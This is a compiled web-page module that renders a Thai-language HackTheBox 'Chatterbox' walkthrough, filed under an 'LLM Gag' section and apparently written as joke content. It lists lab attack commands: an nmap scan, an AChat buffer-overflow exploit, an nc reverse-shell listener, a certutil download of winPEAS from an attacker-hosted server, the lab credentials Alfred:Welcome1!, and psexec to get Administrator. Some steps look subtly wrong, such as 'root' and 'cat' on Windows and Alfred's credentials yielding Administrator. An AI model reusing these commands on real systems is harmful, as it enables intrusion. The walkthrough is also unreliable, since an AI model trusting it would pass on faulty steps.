import{a as e,i as t,s as n,t as r}from"./app-CchzzT6L.js";var i=JSON.parse(`{"path":"/AI/LLM%20Gag/htb-ep1.html","title":"","lang":"en-US","frontmatter":{},"git":{"updatedTime":1749378724000,"contributors":[{"name":"hifat","username":"hifat","email":"logmanxsa@gmail.com","commits":1,"url":"https://github.com/hifat"}],"changelog":[{"hash":"12e48b94e378386433cc3f7be77fabe628f721c0","time":1749378724000,"email":"logmanxsa@gmail.com","author":"hifat","message":"add llm gag content"}]},"filePathRelative":"AI/LLM Gag/htb-ep1.md"}`),a={name:`htb-ep1.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<p>💻 HackTheBox: Chatterbox — &quot;กูไม่ต้องการเธอแล้ว กูได้ root แล้ว&quot; เครื่อง Chatterbox เป็นเครื่อง Windows 7 ที่มีช่องโหว่ที่น่าสนใจ ซึ่งสามารถใช้เพื่อเจาะระบบและได้สิทธิ์ root ได้</p><p>🧠 ขั้นตอนการโจมตี สแกนพอร์ตของเครื่องเป้าหมาย</p><p>ใช้คำสั่ง nmap เพื่อค้นหาพอร์ตที่เปิดอยู่:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">nmap</span><span style="color:#79B8FF;"> -sC</span><span style="color:#79B8FF;"> -sV</span><span style="color:#79B8FF;"> -T4</span><span style="color:#79B8FF;"> 10.10.10.74</span><span style="color:#79B8FF;"> -p</span><span style="color:#9ECBFF;"> 135,139,445,9255,9256,49152,49153,49154,49155,49156,49157</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>จากผลลัพธ์ พบว่า:</p><p>พอร์ต 9255 เปิดให้บริการ AChat chat system</p><p>พอร์ต 9256 เปิดให้บริการ AChat chat system</p><p>ค้นหาช่องโหว่ใน AChat</p><p>ค้นหาช่องโหว่ใน AChat โดยใช้คำสั่ง searchsploit:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">searchsploit</span><span style="color:#9ECBFF;"> AChat</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>พบว่า:</p><p>ช่องโหว่: AChat 0.9.6 - &#39;AChat&#39; Buffer Overflow (Metasploit)</p><p>ช่องโหว่: AChat 0.9.6 - &#39;AChat&#39; Buffer Overflow (Python)</p><p>ใช้ช่องโหว่เพื่อเจาะระบบ</p><p>ใช้สคริปต์ Python ที่มีอยู่ใน Exploit-DB เพื่อโจมตี:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">python</span><span style="color:#9ECBFF;"> 36025.py</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>จากนั้นเปิด listener ด้วย nc:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">nc</span><span style="color:#79B8FF;"> -nlvp</span><span style="color:#79B8FF;"> 4444</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>เมื่อเชื่อมต่อสำเร็จ จะได้ shell ที่มีสิทธิ์ของผู้ใช้ Alfred</p><p>ยกระดับสิทธิ์</p><p>ใช้เครื่องมือ winPEASx86.exe เพื่อค้นหาช่องโหว่ในการยกระดับสิทธิ์:</p><p>ดาวน์โหลด winPEASx86.exe จาก Kali:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">python</span><span style="color:#79B8FF;"> -m</span><span style="color:#9ECBFF;"> SimpleHTTPServer</span><span style="color:#79B8FF;"> 9005</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>ดาวน์โหลดไฟล์ไปยังเครื่องเป้าหมาย:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">certutil</span><span style="color:#79B8FF;"> -urlcache</span><span style="color:#79B8FF;"> -split</span><span style="color:#79B8FF;"> -f</span><span style="color:#9ECBFF;"> http://</span><span style="color:#F97583;">&lt;</span><span style="color:#9ECBFF;">kali-ip-on-vp</span><span style="color:#E1E4E8;">n</span><span style="color:#F97583;">&gt;</span><span style="color:#9ECBFF;">:9005/winPEASx86.exe</span><span style="color:#9ECBFF;"> winPEASx86.exe</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>รัน winPEASx86.exe:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">winPEASx86.exe</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>จากผลลัพธ์ พบว่า:</p><p>AutoLogon credentials: Alfred:Welcome1!</p><p>SMB service: เปิดใช้งานภายในเครื่อง</p><p>ใช้ SMB เพื่อยกระดับสิทธิ์</p><p>ใช้ psexec.py จาก Impacket เพื่อยกระดับสิทธิ์:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">python</span><span style="color:#9ECBFF;"> psexec.py</span><span style="color:#9ECBFF;"> &#39;Alfred:Welcome1!&#39;@10.10.10.74</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>เมื่อเชื่อมต่อสำเร็จ จะได้ shell ที่มีสิทธิ์ของผู้ใช้ Administrator</p><p>รับ root flag</p><p>เข้าถึงไฟล์ root.txt:</p><p>bash Copy Edit</p><div class="language-bash line-numbers-mode line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre class="shiki github-dark vp-code" style="background-color:#24292e;color:#e1e4e8;"><code><span class="line"><span class="line"><span style="color:#B392F0;">cat</span><span style="color:#9ECBFF;"> C:</span><span style="color:#79B8FF;">\\U</span><span style="color:#9ECBFF;">sers</span><span style="color:#79B8FF;">\\A</span><span style="color:#9ECBFF;">dministrator</span><span style="color:#79B8FF;">\\D</span><span style="color:#9ECBFF;">esktop</span><span style="color:#79B8FF;">\\r</span><span style="color:#9ECBFF;">oot.txt</span></span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"></div><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>รับ root flag และโพสต์ว่า: “กูไม่ต้องการเธอแล้ว กูได้ root แล้ว”</p>`,47)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};